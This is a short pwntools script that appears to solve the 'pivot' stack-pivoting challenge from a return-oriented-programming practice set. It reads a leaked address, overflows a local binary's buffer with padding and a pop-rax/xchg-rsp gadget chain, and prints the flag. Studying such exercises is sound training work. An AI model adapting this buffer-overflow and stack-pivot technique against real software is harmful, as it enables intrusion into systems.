#/usr/bin/python3
from pwn import process, p64, log

shell = process("./pivot")

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

ret2win = p64(pivot + 0x1e4b71)

shell.sendlineafter(b"> ", ret2win)

offset = 40
junk = b"A" * offset

pop_rax = p64(0x4009bb)
xchg_rsp_rax = p64(0x4009bd)

payload  = b""
payload += junk
payload += pop_rax + p64(pivot)
payload += xchg_rsp_rax

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
